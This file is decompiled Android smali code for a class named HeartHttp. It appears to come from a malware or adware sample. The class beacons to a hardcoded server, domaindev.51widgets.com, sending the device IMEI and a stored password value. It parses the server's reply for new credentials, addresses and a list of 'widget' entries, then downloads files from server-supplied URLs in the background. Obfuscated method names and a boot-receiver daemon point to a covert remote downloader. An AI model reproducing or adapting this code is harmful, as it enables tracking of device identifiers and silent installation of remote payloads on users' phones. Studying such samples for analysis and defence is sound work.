.class public LDaemon/Global/HeartHttp;
.super Ljava/lang/Object;
.source "HeartHttp.java"

# interfaces
.implements LDaemon/Base/HttpBase;


# static fields
.field private static HeartDown:J = 0x0L

.field private static final url:Ljava/lang/String; = "http://domaindev.51widgets.com/ss/service/action.php?action=heartbeatmody"


# instance fields
.field private final allnum:I

.field private final itemnum:I

.field private reduce:I

.field private timetype:Ljava/lang/String;

.field private widget:[Ljava/lang/String;

.field private widgetnum:I

.field private yeah:I


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    .line 29
    const-wide/16 v0, 0x1388

    sput-wide v0, LDaemon/Global/HeartHttp;->HeartDown:J

    .line 14
    return-void
.end method

.method public constructor <init>()V
    .locals 2

    .prologue
    const/4 v1, 0x0

    const/4 v0, 0x0

    .line 34
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 18
    iput v0, p0, LDaemon/Global/HeartHttp;->reduce:I

    .line 20
    iput v0, p0, LDaemon/Global/HeartHttp;->widgetnum:I

    .line 21
    iput-object v1, p0, LDaemon/Global/HeartHttp;->widget:[Ljava/lang/String;

    .line 23
    const/16 v0, 0x8

    iput v0, p0, LDaemon/Global/HeartHttp;->itemnum:I

    .line 24
    const/16 v0, 0xa

    iput v0, p0, LDaemon/Global/HeartHttp;->allnum:I

    .line 26
    iput-object v1, p0, LDaemon/Global/HeartHttp;->timetype:Ljava/lang/String;

    .line 32
    const/4 v0, 0x1

    iput v0, p0, LDaemon/Global/HeartHttp;->yeah:I

    .line 35
    const/16 v0, 0x50

    new-array v0, v0, [Ljava/lang/String;

    iput-object v0, p0, LDaemon/Global/HeartHttp;->widget:[Ljava/lang/String;

    .line 36
    return-void
.end method


# virtual methods
.method public doWidget()V
    .locals 14

    .prologue
    const/4 v13, 0x3

    const/4 v12, 0x2

    const-string v11, "BootReceiver"

    .line 84
    const/4 v9, 0x0

    .local v9, "i":I
    :goto_0
    iget v0, p0, LDaemon/Global/HeartHttp;->widgetnum:I

    if-lt v9, v0, :cond_0

    .line 126
    return-void

    .line 86
    :cond_0
    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetType(I)I

    move-result v0

    const/4 v1, 0x1

    if-eq v0, v1, :cond_1

    .line 87
    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetType(I)I

    move-result v0

    const/4 v1, 0x4

    if-eq v0, v1, :cond_1

    .line 88
    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetType(I)I

    move-result v0

    const/4 v1, 0x6

    if-eq v0, v1, :cond_1

    .line 89
    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetType(I)I

    move-result v0

    const/4 v1, 0x7

    if-ne v0, v1, :cond_3

    .line 91
    :cond_1
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetPacknum(I)I

    move-result v1

    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetVersion(I)I

    move-result v2

    .line 92
    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetName(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetInfo(I)Ljava/lang/String;

    move-result-object v4

    .line 93
    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetPush(I)I

    move-result v5

    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetPushNum(I)Ljava/lang/String;

    move-result-object v6

    .line 94
    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetUrl(I)Ljava/lang/String;

    move-result-object v7

    .line 91
    invoke-virtual/range {v0 .. v7}, LDaemon/DownLoad/FileDownloader;->setNotice(IILjava/lang/String;Ljava/lang/String;ILjava/lang/String;Ljava/lang/String;)V

    .line 84
    :cond_2
    :goto_1
    add-int/lit8 v9, v9, 0x1

    goto :goto_0

    .line 97
    :cond_3
    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetType(I)I

    move-result v0

    if-eq v0, v12, :cond_4

    .line 98
    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetType(I)I

    move-result v0

    if-eqz v0, :cond_4

    .line 99
    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetType(I)I

    move-result v0

    if-eq v0, v13, :cond_4

    .line 100
    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetType(I)I

    move-result v0

    const/4 v1, 0x5

    if-ne v0, v1, :cond_2

    .line 102
    :cond_4
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetPacknum(I)I

    move-result v1

    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetVersion(I)I

    move-result v2

    .line 103
    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetName(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetInfo(I)Ljava/lang/String;

    move-result-object v4

    .line 104
    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetPush(I)I

    move-result v5

    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetPushNum(I)Ljava/lang/String;

    move-result-object v6

    .line 105
    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetUrl(I)Ljava/lang/String;

    move-result-object v7

    .line 102
    invoke-virtual/range {v0 .. v7}, LDaemon/DownLoad/FileDownloader;->setType(IILjava/lang/String;Ljava/lang/String;ILjava/lang/String;Ljava/lang/String;)I

    move-result v10

    .line 108
    .local v10, "type":I
    if-ne v10, v12, :cond_5

    invoke-static {}, LDaemon/Service/OnlineThread;->md31ed5d2()Z

    move-result v0

    if-eqz v0, :cond_5

    .line 110
    :try_start_0
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetUrl(I)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x3

    invoke-virtual {v0, v1, v2}, LDaemon/DownLoad/FileDownloader;->UpdateFileDownloader(Ljava/lang/String;I)V

    .line 111
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, LDaemon/DownLoad/FileDownloader;->download(LDaemon/DownLoad/DownloadProgressListener;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    .line 112
    :catch_0
    move-exception v0

    move-object v8, v0

    .line 113
    .local v8, "e":Ljava/lang/Exception;
    const-string v0, "BootReceiver"

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "Down Load error:"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v9}, LDaemon/Global/HeartHttp;->getWidgetUrl(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v11, v0}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1

    .line 115
    .end local v8    # "e":Ljava/lang/Exception;
    :cond_5
    if-eqz v10, :cond_6

    invoke-static {}, LDaemon/Service/OnlineThread;->md31ed5d2()Z

    move-result v0

    if-nez v0, :cond_2

    .line 116
    :cond_6
    add-int/lit8 v9, v9, -0x1

    .line 118
    :try_start_1
    sget-wide v0, LDaemon/Global/HeartHttp;->HeartDown:J

    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V

    .line 119
    const-string v0, "BootReceiver"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "Down wait:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto/16 :goto_1

    .line 120
    :catch_1
    move-exception v0

    move-object v8, v0

    .line 121
    .restart local v8    # "e":Ljava/lang/Exception;
    const-string v0, "BootReceiver"

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "Down wait error:"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v11, v0}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_1
.end method

.method public getHttpUrl()Ljava/lang/String;
    .locals 3

    .prologue
    .line 135
    const-string v0, ""

    .line 136
    .local v0, "URL":Ljava/lang/String;
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "&imei="

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->reghttp:LDaemon/Global/RegHttp;

    invoke-virtual {v2}, LDaemon/Global/RegHttp;->getImei()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&mdpsw="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, LHamsterSuper/Client/Deamon/BootReceiver;->reghttp:LDaemon/Global/RegHttp;

    invoke-virtual {v2}, LDaemon/Global/RegHttp;->getuser_value()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 137
    const-string v2, "&version="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const/16 v2, 0x65

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&channe="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const v2, 0x605c380

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&yeah="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget v2, p0, LDaemon/Global/HeartHttp;->yeah:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 136
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 138
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "http://domaindev.51widgets.com/ss/service/action.php?action=heartbeatmody"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    return-object v1
.end method

.method public getTimeType()Ljava/lang/String;
    .locals 1

    .prologue
    .line 46
    iget-object v0, p0, LDaemon/Global/HeartHttp;->timetype:Ljava/lang/String;

    return-object v0
.end method

.method public getWidgetInfo(I)Ljava/lang/String;
    .locals 3
    .param p1, "list"    # I

    .prologue
    .line 58
    iget-object v1, p0, LDaemon/Global/HeartHttp;->widget:[Ljava/lang/String;

    mul-int/lit8 v2, p1, 0x8

    add-int/lit8 v2, v2, 0x2

    aget-object v0, v1, v2

    .line 59
    .local v0, "Info":Ljava/lang/String;
    return-object v0
.end method

.method public getWidgetName(I)Ljava/lang/String;
    .locals 3
    .param p1, "list"    # I

    .prologue
    .line 54
    iget-object v1, p0, LDaemon/Global/HeartHttp;->widget:[Ljava/lang/String;

    mul-int/lit8 v2, p1, 0x8

    add-int/lit8 v2, v2, 0x1

    aget-object v0, v1, v2

    .line 55
    .local v0, "Name":Ljava/lang/String;
    return-object v0
.end method

.method public getWidgetPacknum(I)I
    .locals 3
    .param p1, "list"    # I

    .prologue
    .line 50
    iget-object v1, p0, LDaemon/Global/HeartHttp;->widget:[Ljava/lang/String;

    mul-int/lit8 v2, p1, 0x8

    add-int/lit8 v2, v2, 0x0

    aget-object v1, v1, v2

    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    .line 51
    .local v0, "Packnum":I
    return v0
.end method

.method public getWidgetPush(I)I
    .locals 3
    .param p1, "list"    # I

    .prologue
    .line 74
    iget-object v1, p0, LDaemon/Global/HeartHttp;->widget:[Ljava/lang/String;

    mul-int/lit8 v2, p1, 0x8

    add-int/lit8 v2, v2, 0x6

    aget-object v1, v1, v2

    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    .line 75
    .local v0, "Push":I
    return v0
.end method

.method public getWidgetPushNum(I)Ljava/lang/String;
    .locals 3
    .param p1, "list"    # I

    .prologue
    .line 78
    iget-object v1, p0, LDaemon/Global/HeartHttp;->widget:[Ljava/lang/String;

    mul-int/lit8 v2, p1, 0x8

    add-int/lit8 v2, v2, 0x7

    aget-object v0, v1, v2

    .line 79
    .local v0, "PushNum":Ljava/lang/String;
    return-object v0
.end method

.method public getWidgetType(I)I
    .locals 3
    .param p1, "list"    # I

    .prologue
    .line 62
    iget-object v1, p0, LDaemon/Global/HeartHttp;->widget:[Ljava/lang/String;

    mul-int/lit8 v2, p1, 0x8

    add-int/lit8 v2, v2, 0x3

    aget-object v1, v1, v2

    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    .line 63
    .local v0, "Type":I
    return v0
.end method

.method public getWidgetUrl(I)Ljava/lang/String;
    .locals 3
    .param p1, "list"    # I

    .prologue
    .line 66
    iget-object v1, p0, LDaemon/Global/HeartHttp;->widget:[Ljava/lang/String;

    mul-int/lit8 v2, p1, 0x8

    add-int/lit8 v2, v2, 0x4

    aget-object v0, v1, v2

    .line 67
    .local v0, "url":Ljava/lang/String;
    return-object v0
.end method

.method public getWidgetVersion(I)I
    .locals 3
    .param p1, "list"    # I

    .prologue
    .line 70
    iget-object v1, p0, LDaemon/Global/HeartHttp;->widget:[Ljava/lang/String;

    mul-int/lit8 v2, p1, 0x8

    add-int/lit8 v2, v2, 0x5

    aget-object v1, v1, v2

    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1

    mul-int/lit8 v1, v1, 0xa

    invoke-virtual {p0, p1}, LDaemon/Global/HeartHttp;->getWidgetType(I)I

    move-result v2

    add-int v0, v1, v2

    .line 71
    .local v0, "Version":I
    return v0
.end method

.method public getYeah()I
    .locals 1

    .prologue
    .line 39
    iget v0, p0, LDaemon/Global/HeartHttp;->yeah:I

    return v0
.end method

.method public parsePackage(Ljava/lang/String;)I
    .locals 12
    .param p1, "temp"    # Ljava/lang/String;

    .prologue
    const/4 v10, 0x0

    const/4 v9, -0x1

    const-string v11, "parsePackage state:end"

    const-string v8, "http"

    .line 145
    const-string v4, "http"

    const-string v4, "parsePackage state:start"

    invoke-static {v8, v4}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 147
    const-string v4, "<msg>"

    invoke-virtual {p1, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    if-eq v4, v9, :cond_0

    .line 148
    const-string v4, "msg"

    invoke-static {p1, v4}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    sput-object v4, LDaemon/Service/RerviceHttp;->msg:Ljava/lang/String;

    .line 149
    const/4 v4, 0x2

    .line 181
    :goto_0
    return v4

    .line 156
    :cond_0
    :try_start_0
    const-string v4, "timetype"

    invoke-static {p1, v4}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, LDaemon/Global/HeartHttp;->timetype:Ljava/lang/String;

    .line 157
    const-string v4, "mdpassword"

    invoke-static {p1, v4}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 158
    .local v3, "z":Ljava/lang/String;
    sget-object v4, LHamsterSuper/Client/Deamon/BootReceiver;->reghttp:LDaemon/Global/RegHttp;

    invoke-virtual {v4, v3}, LDaemon/Global/RegHttp;->setuser_value(Ljava/lang/String;)V

    .line 159
    const-string v4, "address"

    invoke-static {p1, v4}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 160
    .local v0, "address":Ljava/lang/String;
    const-string v4, "upgrade"

    invoke-static {p1, v4}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    .line 161
    .local v2, "upgrade":I
    const-string v4, "reduce"

    invoke-static {p1, v4}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v4

    iput v4, p0, LDaemon/Global/HeartHttp;->reduce:I

    .line 162
    const-string v4, "time"

    invoke-static {p1, v4}, LDaemon/Base/Tools;->ma1ab37e8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v4

    const-wide/16 v6, 0x3e8

    mul-long/2addr v4, v6

    sput-wide v4, LHamsterSuper/Client/Deamon/BootReceiver;->hearttime:J

    .line 163
    sget-object v4, LHamsterSuper/Client/Deamon/BootReceiver;->reghttp:LDaemon/Global/RegHttp;

    invoke-virtual {v4, v0}, LDaemon/Global/RegHttp;->setAddress(Ljava/lang/String;)V

    .line 164
    sget-object v4, LHamsterSuper/Client/Deamon/BootReceiver;->reghttp:LDaemon/Global/RegHttp;

    invoke-virtual {v4, v2}, LDaemon/Global/RegHttp;->setUpgrade(I)V

    .line 166
    const/4 v4, 0x0

    iput v4, p0, LDaemon/Global/HeartHttp;->widgetnum:I

    .line 167
    const-string v4, "<widget>"

    invoke-virtual {p1, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    if-eq v4, v9, :cond_1

    .line 169
    iget-object v4, p0, LDaemon/Global/HeartHttp;->widget:[Ljava/lang/String;

    const/16 v5, 0xa

    const/16 v6, 0x8

    invoke-static {p1, v4, v5, v6}, LDaemon/Base/Tools;->me633b318(Ljava/lang/String;[Ljava/lang/String;II)[Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, LDaemon/Global/HeartHttp;->widget:[Ljava/lang/String;

    .line 170
    sget v4, LDaemon/Base/Tools;->string_all_num:I

    iput v4, p0, LDaemon/Global/HeartHttp;->widgetnum:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 179
    :cond_1
    const-string v4, "http"

    const-string v4, "parsePackage state:end"

    invoke-static {v8, v11}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 181
    const/4 v4, 0x1

    goto :goto_0

    .line 175
    .end local v0    # "address":Ljava/lang/String;
    .end local v2    # "upgrade":I
    .end local v3    # "z":Ljava/lang/String;
    :catch_0
    move-exception v4

    move-object v1, v4

    .line 176
    .local v1, "e":Ljava/lang/Exception;
    const-string v4, "http"

    const-string v4, "parsePackage state:end"

    invoke-static {v8, v11}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    move v4, v10

    .line 177
    goto :goto_0
.end method

.method public setPaintState(I)V
    .locals 1
    .param p1, "httpEnd"    # I

    .prologue
    .line 191
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->reghttp:LDaemon/Global/RegHttp;

    invoke-virtual {v0}, LDaemon/Global/RegHttp;->download()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 193
    invoke-virtual {p0}, LDaemon/Global/HeartHttp;->doWidget()V

    .line 195
    :cond_0
    const/4 v0, 0x0

    sput-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->online:LDaemon/Service/OnlineThread;

    .line 196
    iget v0, p0, LDaemon/Global/HeartHttp;->reduce:I

    if-nez v0, :cond_1

    .line 197
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->mostsphttp:LDaemon/Global/MostSpHttp;

    invoke-static {v0}, LDaemon/Service/RerviceHttp;->m39bca0c7(LDaemon/Base/HttpBase;)V

    .line 202
    :cond_1
    packed-switch p1, :pswitch_data_0

    .line 218
    :pswitch_0
    return-void

    .line 202
    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_0
        :pswitch_0
    .end packed-switch
.end method

.method public setYeah(I)V
    .locals 0
    .param p1, "yeah"    # I

    .prologue
    .line 42
    iput p1, p0, LDaemon/Global/HeartHttp;->yeah:I

    .line 43
    return-void
.end method
